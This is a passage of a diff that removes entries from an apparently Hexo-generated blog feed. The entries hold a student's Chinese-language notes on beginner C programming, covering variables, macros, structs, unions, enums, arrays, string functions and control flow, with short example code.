class="line">    for (j&#x3D;0;j&lt;n;j++)</span><br><span class="line">a[i*n+j]</span><br></pre></td></tr></table></figure><h4 id="三-变量"><a href="#三-变量" class="headerlink" title="三.变量"></a>三.变量</h4><p>1.局部变量：在一个复合语句当中定义的一个变量；全局变量：在函数外部定义的变量，也称为外部变量。当全局变量与局部变量重名时，局部变量有效，而全局变量失效。</p><p>2.动态变量：auto| auto int a=1 相当于int a=1 ；</p><p>   静态变量：static|用类型变量在被调用后不会清除，其值会被保留；</p><p>   寄存器变量：register</p><h5 id="关键词extern"><a href="#关键词extern" class="headerlink" title="关键词extern:"></a>关键词extern:</h5><p>当外部变量不在文件开头定义时，则仅限于定义处到文件结束范围之内使用该变量，若要在作用域范围之外使用全局变量，则可以使用extern关键词来声明外部变量。</p><h4 id="四-宏定义"><a href="#四-宏定义" class="headerlink" title="四.宏定义"></a>四.宏定义</h4><p>1.宏定义是指将一个标识符（又称为宏名）定义为一个字符串。在执行代码时，所有宏名的值都为该字符串。</p><p>2.宏定义不是c程序语言，不必在句尾加封号，且要在函数代码块外声明定义。</p><p>3.被双引号括起来的标识符（变量名）即使与宏名一样，也不会被宏定义替换。</p><p>4.使用带参宏定义时要注意，宏定义不会对形参进行计算，这就要注意形参参与加减乘除时的整体性，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define square1(x) x*x</span><br><span class="line">int square (int x)</span><br><span class="line">&#123;   return (x*x);</span><br><span class="line"> &#125; </span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> int m&#x3D;10;</span><br><span class="line"> printf(&quot;10的平方为:%d&#x3D;%d\n&quot;,square(10),square1(10));</span><br><span class="line"> printf(&quot;11的平方为:%d!&#x3D;%d\n&quot;,square(10+1),square1(10+1));</span><br><span class="line"> printf(&quot;11的平方为:%d!&#x3D;%d\n&quot;,square(++m),square1(++m));</span><br><span class="line"> return 0;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10的平方为:100&#x3D;100</span><br><span class="line">11的平方为:121!&#x3D;21</span><br><span class="line">11的平方为:169!&#x3D;144</span><br></pre></td></tr></table></figure><p>5.宏定义时，字符串可以是任何类型的数据。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h4 id=&quot;一-函数&quot;&gt;&lt;a href=&quot;#一-函数&quot; class=&quot;headerlink&quot; title=&quot;一.函数&quot;&gt;&lt;/a&gt;一.函数&lt;/h4&gt;&lt;p&gt;1.系统运行C语言程序时，从主函数开始计算，当遇到自定义函数时，转到自定义函数进行运算，最后回到主</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第四章汇总（3）</title>
-    <link href="http://example.com/2020/11/01/blog6/"/>
-    <id>http://example.com/2020/11/01/blog6/</id>
-    <published>2020-11-01T01:37:48.000Z</published>
-    <updated>2021-01-30T14:54:11.902Z</updated>
-    
-    <content type="html"><![CDATA[<p>一.结构体</p><p>1.成员的类型可以是另一个结构体的类型，如：存在struct  a  b，即意味b是struct  a型。</p><p>2.如果两个结构体的成员类型，名称，个数相同，但结构体名不同，也是两个不同的结构类型。</p><p>3.成员名可以和程序中的变量名相同，二者不代表同一对象。如：程序中可以定义“int num”，同时还可以在struct结构中定义”int num“。</p><p>4.初值内容用“{}”括起来，各组数据用“，”隔开，并且数据应与结构体类型定义时的成员个数相等，类型一致。</p><p>5.如果初值个数少于结构体成员个数，则自动为无初值的成员赋值0；若多余则编译错误。</p><p>二.新的关键词</p><p>1.const是C语言中的一个关键词，他限定一个变量不允许被改变。使用const在一定程度上提高程序的安全性和可靠性。</p><p>2.enum是枚举类型的引导字，用于声明枚举类型。</p><p>3.typedef用于声明一种新类型名来代替旧类型名。</p><p>三.共用体</p><p>1.共用体类型是一种多个不同类型共享储蓄空间的构造类型，即共用体变量的所有成员占同一个储蓄空间。</p><p>2.共用体变量所占空间的大小取决于占储蓄空间最大的成员，而不是各个成员的储蓄空间之和，这点是与结构体变量有着本质上的不同。</p><p>3.对共用体的某一成员赋值，会覆盖其他成员原来的数据，原来成员的值就不存在了，因此，共用体变量中起作用的是最后一次存入的成员变量的值。例如：</p><p>x.a=10;x.b=20;printf(“%d%f”,x.a,x.b);       输出结果为：0  20.0</p><p>四.枚举类型</p><p>1.enum 语法格式：</p><p>   enum  枚举名</p><p>   {     枚举值1[=整型常数1]，枚举值2[=整型常数2]….   }；</p><p>2.括号内的“=整型常数”可以省略。如果省略，编译程序按照顺序给每个枚举元素一个对应的整数值，整数值从0开始，后续元素顺序加1.</p><p>3.在C语言中，枚举变量的值不能直接进行输入和输出，只能间接地实现输出和输入的操作。例如使用switch（）语句。</p><p>4.不能把枚举常量对应的序号直接赋值给枚举变量。如枚举变量=1。</p><p>5.可以用强制类型转换为枚举变量赋值，如：枚举变量=（enum 枚举名）（1）。</p><p>五.自定义类型名</p><p>1.语法格式：typedef  类型名 新类型名</p><p>2.特别的，用typedef语法定义数组类型名，如：typedef int appay[10]//定义appay为有十个元素的整型数组类型名。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;一.结构体&lt;/p&gt;
-&lt;p&gt;1.成员的类型可以是另一个结构体的类型，如：存在struct  a  b，即意味b是struct  a型。&lt;/p&gt;
-&lt;p&gt;2.如果两个结构体的成员类型，名称，个数相同，但结构体名不同，也是两个不同的结构类型。&lt;/p&gt;
-&lt;p&gt;3.成员名可以和程序中的</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第四章汇总（2）</title>
-    <link href="http://example.com/2020/10/31/blog5/"/>
-    <id>http://example.com/2020/10/31/blog5/</id>
-    <published>2020-10-31T12:00:08.000Z</published>
-    <updated>2021-01-30T14:53:54.758Z</updated>
-    
-    <content type="html"><![CDATA[<p>一.字符数组</p><p>1.若不对字符数组进行初始化，则数组中各元素的值是不可预知的。</p><p>2.若花括号内提供的字符数组个数多余数组长度，则会产生编译错误的信息。</p><p>3.若花括号内提供的字符数组个数少余数组长度，则编译器将这些字符优先赋值给前面的元素，其余元素取值（’\0’）。</p><p>4.用字符串常量直接赋值时，可省略花括号，用“”覆盖字符串常量。用字符常量逐个赋初值，时花括号不可省略，且各个字符由’’覆盖，字符间用逗号隔开。</p><p>5.C语言中，字符串是以字符’\0’结尾，故它会额外占据数组一格内存。</p><p>6.使用%c格式说明符进行逐个字符的输入/输出；使用%s格式说明符进行字符串的输入/输出。</p><p>7.当一个字符表示为字符串变量名时，其本身就是该字符串的首地址，即scanf（）函数输入时无需再使加取地址符“&amp;”。</p><p>8.使用字符串函数时要在程序开头用“#include&lt;string.h&gt;”命令将头文件&lt;string.h&gt;包括进来。</p><p>9.引用字符要用“ ‘’ ”。</p><p>二.新函数</p><p>a 字符串复制函数strcpy（）； 用法：若strcpy（字符数组1，字符数组2），将字符串1/字符数组2连同结束标志’\0’复制到字符数组1中。</p><p>b 字符串连续函数strcat（） ；用法：若strcpy（字符数组1，字符数组2），链接两个字符串，把字符串2连接到字符串1后面，再把得到的结果放在字符串1中。</p><p>c  字符串比较函数strcmp（） ； 用法：若strcmp（字符串1，字符串2）</p><p>d 求字符串长度strlen（）；用法：若strlen（字符串），检测字符串中字符的个数，不包括’\0’。</p><p>e 大写字母转换小写字母函数strlwr（）。</p><p>f 小写字母换号大写字母函数strupr（）。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;一.字符数组&lt;/p&gt;
-&lt;p&gt;1.若不对字符数组进行初始化，则数组中各元素的值是不可预知的。&lt;/p&gt;
-&lt;p&gt;2.若花括号内提供的字符数组个数多余数组长度，则会产生编译错误的信息。&lt;/p&gt;
-&lt;p&gt;3.若花括号内提供的字符数组个数少余数组长度，则编译器将这些字符优先赋值给前面的元</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第四章汇总（1）</title>
-    <link href="http://example.com/2020/10/22/blog4/"/>
-    <id>http://example.com/2020/10/22/blog4/</id>
-    <published>2020-10-22T13:19:02.000Z</published>
-    <updated>2021-01-30T14:53:34.438Z</updated>
-    
-    <content type="html"><![CDATA[<p>一.   一维数组</p><p>1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组；</p><p>​            c  “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减；</p><p>​            d  数组下标是从0开始的，且数组最后一个元素的下标为该数组元素个数减一；</p><p>​            e  C语言中只能逐个使用数组中的元素，不能一次性引用多个元素，如：a[2]=1，意为将1的值赋值给该数组的第二个元素；</p><p>​            f  若未给数组中元素赋值，则其输出结果为不确定值；</p><p>​            g 当所赋初值个数多余该数组的元素个数时，在编译时出错，无结果；当所赋初值个数少于该数组的元素个数时，会自动给未赋值的元素赋值为0。</p><ol start="2"><li><p>a 产生随机数：利用rand()函数，其原型为int rand(void)。要产生[n,m]范围内随机整数，要利用公式(int)(n+(m-n)*rand()/RAND_MAX)</p><p>b  初始化随机数发生器：srand()，其函数原型为void srand(unsigned int seed)。seed是随机数种子，为了产生不可预见的随机数，通常用time(0)返回的值作为随机种子。而函数time(0)包含在头文件&lt;time.h&gt;中。</p></li></ol><p>二.   二维数组</p><ol><li>初始化二维数组时，可省略第一维的长度，但第二维长度不能忽略。</li><li>按顺序赋值并且省略第一维的长度时，数组第一维的大小按以下规则决定。设有n个初值数据，第二维长度为m，由于可能只对部分数据赋值，n/m不一定会被整除，因此第一维的大小通常为(int)(n/m+1).</li><li>矩阵转置：将一个二维数组的行和列元素进行互换。即将二维数组a中的第i行第j列元素赋给二位数组b中的第j行第i列。</li></ol><p>三.字符串函数</p><p>strcmp(字符串1,字符串2)</p><p>用法：两个字符串自左向右一个个比对，直到出现不同的字符或遇到‘\0’为止。（若字符串第一个字符比对就不同，那么即停止比对）。函数的返回值——a.若字符串1=字符串2，那么返回值为0；b.若字符串1&gt;字符串2，那么返回值为正整数；c.若字符串1&lt;字符串2，那么返回值为负整数。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;一.   一维数组&lt;/p&gt;
-&lt;p&gt;1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组；&lt;/p&gt;
-&lt;p&gt;​            c  “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减；&lt;/p&gt;
-&lt;p&gt;​            d  数</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第三章汇总</title>
-    <link href="http://example.com/2020/10/18/blog3/"/>
-    <id>http://example.com/2020/10/18/blog3/</id>
-    <published>2020-10-18T08:15:25.000Z</published>
-    <updated>2021-01-30T14:53:10.262Z</updated>
-    
-    <content type="html"><![CDATA[<p>1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。</p><p>2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。</p><p>3.swich语句:a.switch()括号内的整型表达式也可以是字符型变量的表达式。</p><p>​                      b.当执行完某个语句组后遇到break，则跳出此switch结构，执行下一代码指令。</p><p>4.while语句:先进行条件判断，再执行循环语句。</p><p>while语句的一个小妙用，例如：(当a自减到0时即会停止循环)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a&#x3D;3;</span><br><span class="line">while(a) a--;</span><br></pre></td></tr></table></figure><p>5.do-while语句:先执行循环语句，在进行条件判断。当遇到单独属于do-while结构中的break时会跳出do-while语句。</p><p>6.for语句:执行for(表达式1;表达式2;表达式3;)时，先执行表达式1和2，再执行循环体，最后执行表达式3。以此循环。</p><p>7.else-if语句：从表达式一开始计算，当遇到表达式n成立时，跳出该if镶嵌语句。</p><p>8.continue语句：结束本次循环，即不再执行continue后的代码，转入下一次循环的判断和执行。（但不会跳出该循环）</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。&lt;/p&gt;
-&lt;p&gt;2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。&lt;/p&gt;
-&lt;p&gt;3.swich语句:a.switch()括号内的整型表达式也可以是</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>近半个月学习总结</title>
-    <link href="http://example.com/2020/10/04/blog2/"/>
-    <id>http://example.com/2020/10/04/blog2/</id>
-    <published>2020-10-04T02:23:06.000Z</published>
-    <updated>2021-01-30T14:52:49.717Z</updated>
-    
-    <content type="html"><![CDATA[<p>第一单元<br>1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。<br>2.”lf”为输出double数据时的修饰符。<br>3.多输代码，熟练scanf，printf语句(基础函数)。<br>4.printf函数输出时”c”表示输出单个字符，而”s”表示输出字符串。<br>5.使用dev c++编写用对象流实现输入输出代码时，要注意头文件应表达为<iostream>，<iomanip>且在int main()之前添加”using nemespce std”。<br>6.C语言中关键字不能用作变量名。</iomanip></iostream></p><p>7.scanf函数语句中不能对其进行格式化。如scanf（“%.3f”，&amp;a），这是错误格式。</p><p>8.注意除数！如一个数除2和除2.0得到的答案完全不同。除以2的话会当成整型变量运算，除以2.0的话则按照实型变量计算。</p><p>第二单元<br>1.”/“运算，若除数与被除数均为整数型数据，则结果也为整数型。若要保留小数，则需用以下三种格式:”1.0/1”,”1/1.0”,”1.0/1.0”。<br>2.”%”，操作数必须为整数，且运算结果答案与左侧数据符号一致。<br>3.自增自减。a.无论运算符号在整型变量的前后，运算后该整型变量的值都相同。<br>            b.运算符仅能用于整型变量，不能用于常量和表达式。<br>4.关系运算符主导的表达式的结果只有”1”,”0”两种，即计算机只判断真伪。<br>5.赋值运算符的左侧只能是变量，不能是常量和表达式。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;第一单元&lt;br&gt;1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。&lt;br&gt;2.”lf”为输出double数据时的修饰符。&lt;br&gt;3.多输代码，熟练scanf，printf语句(基础函数)。&lt;br&gt;4.printf函数输出时”c”表示输出单个字</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
     
   </entry>
   
